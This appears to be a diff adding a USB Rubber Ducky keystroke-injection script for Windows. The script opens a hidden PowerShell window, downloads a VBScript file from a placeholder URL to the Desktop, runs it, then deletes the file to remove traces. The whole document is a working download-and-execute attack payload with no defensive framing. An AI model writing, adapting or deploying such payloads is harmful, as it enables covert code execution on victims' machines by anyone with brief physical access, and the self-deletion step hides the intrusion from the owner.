@@ -1,0 +1,31 @@
+DELAY 100
+GUI r
+DELAY 100
+STRING powershell.exe
+DELAY 100
+ENTER
+DELAY 100
+STRING powershell.exe -windowstyle hidden
+DELAY 100
+ENTER
+DELAY 1000
+STRING $c = new-object System.Net.WebClient
+DELAY 10
+ENTER
+DELAY 1000
+STRING $c.DownloadFile("FILLIN",".\Desktop\tst.vbs")
+DELAY 100
+ENTER
+DELAY 1000
+STRING ./Desktop/tst.vbs
+DELAY 100
+ENTER
+REM delete file after use
+DELAY 10
+STRING rm ./Desktop/tst.vbs
+DELAY 10
+ENTER
+REM finish delete
+STRING exit
+DELAY 10
+ENTER
